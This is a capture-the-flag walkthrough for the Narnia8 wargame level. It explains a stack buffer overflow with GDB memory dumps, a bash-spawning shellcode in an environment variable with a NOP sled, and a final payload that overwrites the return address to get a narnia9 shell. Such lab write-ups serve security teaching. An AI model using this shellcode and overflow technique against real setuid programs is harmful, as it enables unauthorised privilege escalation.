# Narnia8 - Buffer Overflow Exploitation

## Goal

Gain a shell as `narnia9` by exploiting a buffer overflow vulnerability in the `narnia8` binary.

---

## Vulnerable Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int i;

void func(char *b){
    char *blah = b;
    char bok[20];

    memset(bok, '\0', sizeof(bok));
    for(i = 0; blah[i] != '\0'; i++)
        bok[i] = blah[i];

    printf("%s\n", bok);
}

int main(int argc, char **argv){
    if(argc > 1)
        func(argv[1]);
    else
        printf("%s argument\n", argv[0]);

    return 0;
}
```

Let’s see what the func do. We have a bok[20] , and *blah which is a pointer to argv[1]. Then we copy from blah[i] to bok[i] until blah is != 0.

```
narnia8@gibson:~$ cd /narnia
narnia8@gibson:/narnia$ ls -la
total 160
drwxr-xr-x  2 root    root     4096 Apr 10 14:24 .
drwxr-xr-x 28 root    root     4096 Jul  4 13:31 ..
-r-sr-x---  1 narnia1 narnia0 15044 Apr 10 14:23 narnia0
-r--r-----  1 narnia0 narnia0  1229 Apr 10 14:23 narnia0.c
-r-sr-x---  1 narnia2 narnia1 14884 Apr 10 14:23 narnia1
-r--r-----  1 narnia1 narnia1  1021 Apr 10 14:23 narnia1.c
-r-sr-x---  1 narnia3 narnia2 11280 Apr 10 14:23 narnia2
-r--r-----  1 narnia2 narnia2  1022 Apr 10 14:23 narnia2.c
-r-sr-x---  1 narnia4 narnia3 11520 Apr 10 14:24 narnia3
-r--r-----  1 narnia3 narnia3  1699 Apr 10 14:24 narnia3.c
-r-sr-x---  1 narnia5 narnia4 11312 Apr 10 14:24 narnia4
-r--r-----  1 narnia4 narnia4  1080 Apr 10 14:24 narnia4.c
-r-sr-x---  1 narnia6 narnia5 11512 Apr 10 14:24 narnia5
-r--r-----  1 narnia5 narnia5  1262 Apr 10 14:24 narnia5.c
-r-sr-x---  1 narnia7 narnia6 11568 Apr 10 14:24 narnia6
-r--r-----  1 narnia6 narnia6  1602 Apr 10 14:24 narnia6.c
-r-sr-x---  1 narnia8 narnia7 12036 Apr 10 14:24 narnia7
-r--r-----  1 narnia7 narnia7  1964 Apr 10 14:24 narnia7.c
-r-sr-x---  1 narnia9 narnia8 11320 Apr 10 14:24 narnia8
-r--r-----  1 narnia8 narnia8  1269 Apr 10 14:24 narnia8.c
narnia8@gibson:/narnia$ ./narnia8 AAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAA�����������
narnia8@gibson:/narnia$ ./narnia8 AAAAAAAAAAAAAAA
AAAAAAAAAAAAAAA
narnia8@gibson:/narnia$ ./narnia8 AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAA������������
narnia8@gibson:/narnia$ ./narnia8 AAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAA
narnia8@gibson:/narnia$ 

```
GDB

```
Breakpoint 2, 0x0804917c in func ()
(gdb) continue
Continuing.
AAAAAAAAAAAAAAAAAAAA������������

Breakpoint 3, 0x080491e4 in func ()
(gdb) x20wx $esp
Undefined command: "x20wx".  Try "help".
(gdb) x/20wx $esp
0xffffd35c:     0x0804a008      0xffffd364      0x41414141      0x41414141
0xffffd36c:     0x41414141      0x41414141      0x41414141      0xffffd5bd
0xffffd37c:     0xffffd388      0x08049201      0xffffd5bd      0x00000000
0xffffd38c:     0xf7da1cb9      0x00000002      0xffffd444      0xffffd450
0xffffd39c:     0xffffd3b0      0xf7fade34      0x0804908d      0x00000002
(gdb) 

```
n GDB, we can observe the stack and see that the (20 * 'A') reaches the address of blah perfectly before any overwrite.
If we use (21 * 'A') as shown in the snippet below, we already start overwriting the address of blah.

```
0x080491cf in func ()
(gdb) x/20wx $esp
0xffffd364:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd374:     0x41414141      0xffffff41      0xffffd388      0x08049201
0xffffd384:     0xffffd5bc      0x00000000      0xf7da1cb9      0x00000002
0xffffd394:     0xffffd444      0xffffd450      0xffffd3b0      0xf7fade34
0xffffd3a4:     0x0804908d      0x00000002      0xffffd444      0xf7fade34
(gdb) 


```

It can also be observed that the address of blah, which comes right after the bok buffer, changes with each additional byte added.

```
(gdb) x/20wx $esp
0xffffd35c:     0x0804a008      0xffffd364      0x41414141      0x41414141
0xffffd36c:     0x41414141      0x41414141      0x00004141      0xffffd5bf
0xffffd37c:     0xffffd388      0x08049201      0xffffd5bf      0x00000000
0xffffd38c:     0xf7da1cb9      0x00000002      0xffffd444      0xffffd450
0xffffd39c:     0xffffd3b0      0xf7fade34      0x0804908d      0x00000002

(gdb) x/20wx $esp
0xffffd35c:     0x0804a008      0xffffd364      0x41414141      0x41414141
0xffffd36c:     0x41414141      0x41414141      0x00414141      0xffffd5be
0xffffd37c:     0xffffd388      0x08049201      0xffffd5be      0x00000000
0xffffd38c:     0xf7da1cb9      0x00000002      0xffffd444      0xffffd450
0xffffd39c:     0xffffd3b0      0xf7fade34      0x0804908d      0x00000002

(gdb) x/20wx $esp
0xffffd35c:     0x0804a008      0xffffd364      0x41414141      0x41414141
0xffffd36c:     0x41414141      0x41414141      0x41414141      0xffffd5bd
0xffffd37c:     0xffffd388      0x08049201      0xffffd5bd      0x00000000
0xffffd38c:     0xf7da1cb9      0x00000002      0xffffd444      0xffffd450
0xffffd39c:     0xffffd3b0      0xf7fade34      0x0804908d      0x00000002

```
It is also noticeable that on the stack, just ahead, there is the return address of the func function: 0x08049201. This return address is what we will overwrite to point to our shellcode.

I will use the following shellcode:

```
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
"\x51\x53\x89\xe1\xcd\x80"
```
The next step is to inject NOPs + shellcode through an environment variable, as shown in the example below.

```
narnia8@gibson:/narnia$ export SHELLCODE=$(python3 -c 'print("\x90"*50 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")')
narnia8@gibson:/narnia$ gdb -q ./narnia8
Reading symbols from ./narnia8...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Enable debuginfod for this session? (y or [n]) y
Debuginfod has been enabled.
To make this setting permanent, add 'set debuginfod enabled on' to .gdbinit.
Download failed: Permission denied.  Continuing without separate debug info for /narnia/narnia8.
(No debugging symbols found in ./narnia8)
(gdb) break main
Breakpoint 1 at 0x80491ed
(gdb) run
Starting program: /narnia/narnia8 
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x080491ed in main ()
(gdb) x/s *((char**)environ+1)
0xffffd549:     "SHELLCODE=", '\302\220' <repeats 50 times>, "j\vX\302\231Rfh-p\302\211áRjhh/bash/bin\302\211ãRQS\302\211áÍ\302\200"
(gdb) 

```
In GDB, we can see the pointer to our SHELLCODE as 0xffffd584. We need to adjust this address to ensure that, even if the NOPs fail, execution still lands correctly on the shellcode.

```
Breakpoint 1, 0x080491ed in main ()
(gdb) x/s *((char**)environ+1)
0xffffd584:     "SHELLCODE=", '\302\220' <repeats 50 times>, "j\vX\302\231Rfh-p\302\211áRjhh/bash/bin\302\211ãRQS\302\211áÍ\302\200"
(gdb) x/s 0xffffd549+10
0xffffd58e:     '\302\220' <repeats 50 times>, "j\vX\302\231Rfh-p\302\211áRjhh/bash/bin\302\211ãRQS\302\211áÍ\302\200"
(gdb) x/s 0xffffd553+50
0xffffd5c0:     '\302\220' <repeats 25 times>, "j\vX\302\231Rfh-p\302\211áRjhh/bash/bin\302\211ãRQS\302\211áÍ\302\200"
(gdb) 

```
First, we add 10 bytes of "SHELLCODE" as a prefix, then 50 bytes of NOPs (\x90). These NOPs serve as a slide — in case the return address doesn't land exactly on the shellcode,
it can "slide" through the NOPs until it reaches it.

Now, with the address of the SHELLCODE pointer in hand, we need to find the address of blah. Keep in mind that the address of blah shifts with each extra byte added to the input.

```
narnia8@gibson:/narnia$ ./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA") | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 7dd5 ffff 18d3 ffff 0192 0408  AAAAB...........
00000020: 7dd5 ffff 0a

```
Using xxd, we were able to see — outside of GDB — the address allocated to blah right after the 20-byte overflow (0xffffd57d), immediately following the junk.

Now, the idea is to craft the payload with:
junk + blah pointer + saved EBP + return address pointing to the SHELLCODE.

We adjust blah as:
blah = 0xffffd57d
But due to how the function works (e.g., stack alignment and pointer dereferencing), we subtract 0xC, landing at blah = 0xffffd571.

Offset summary:

    +0x4 for blah

    +0x4 for saved EBP

    +0x4 for return address
    → So 0xC in total, hence 0xffffd571.

The SHELLCODE address was located at: 0xffffd5c0

So, our payload becomes:
"A"*20 + <0xffffd571 in little endian> + junk for EBP + <0xffffd5c0 in little endian>

Which results in:

```
"AAAAAAAAAAAAAAAAAAAA\x71\xd5\xff\xffAAAA\xc0\xd5\xff\xff"

```

```
narnia8@gibson:/narnia$ ./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA\x71\xd5\xff\xffAAAA\xc0\xd5\xff\xff")
AAAAAAAAAAAAAAAAAAAAq���AAAA����q���
bash-5.2$ whoami
narnia9
bash-5.2$ id
uid=14008(narnia8) gid=14008(narnia8) euid=14009(narnia9) groups=14008(narnia8)
```

